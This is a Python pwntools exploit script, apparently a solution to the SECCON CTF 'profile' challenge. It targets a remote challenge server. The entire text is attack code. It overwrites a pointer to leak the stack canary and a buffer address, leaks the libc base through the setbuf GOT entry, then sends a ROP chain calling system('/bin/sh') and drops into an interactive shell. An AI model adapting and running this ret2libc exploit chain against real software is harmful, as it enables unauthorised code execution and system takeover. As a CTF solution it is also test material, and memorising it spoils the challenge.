from pwn import *

target = ELF('./profile')
POP_RDI_ABS = 0x401713

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# BIN_SH = 0x1619d9

libc = ELF('./libc-2.23.so')
BIN_SH = 0x18cd57

while True:
	# r = process('./profile')
	r = remote('profile.pwn.seccon.jp', 28553)

	r.sendlineafter('Name >> ', 'A' * 8)
	r.sendlineafter('Age >> ', '1')
	r.sendlineafter('Message >> ', 'A' * 10)

	canary = ''
	original_buf_addr = 0
	for i in range(0x20):
		payload = 'A' * 0x10 + chr(i * 8)
		r.sendlineafter('>> ', '1')
		r.sendlineafter('Input new message >> ', payload)

		r.sendlineafter('>> ', '2')
		r.recvuntil('Name : ')
		s = r.recv(8)

		if s[0] == '\x00' and s[7] != '\x00':
			canary = s
		if s[0] == chr(i * 8):
			original_buf_addr = u64(s) + 0x10

	if canary == '':
		r.close()
		continue

	payload = 'A' * 0x10 + p64(target.got['setbuf'])
	r.sendlineafter('>> ', '1')
	r.sendlineafter('Input new message >> ', payload)

	r.sendlineafter('>> ', '2')
	r.recvuntil('Name : ')
	LIBC_BASE = u64(r.recvline().strip().ljust(8, '\x00')) - libc.symbols['setbuf']

	payload = ''
	payload += 'A' * 0x10
	payload += p64(original_buf_addr)
	payload += 'A' * 0x20
	payload += canary
	payload += 'A' * 0x18
	payload += p64(POP_RDI_ABS)
	payload += p64(LIBC_BASE + BIN_SH)
	payload += p64(LIBC_BASE + libc.symbols['system'])
	r.sendlineafter('>> ', '1')
	r.sendlineafter('Input new message >> ', payload)

	r.sendlineafter('>> ', '0')

	r.interactive()

	break
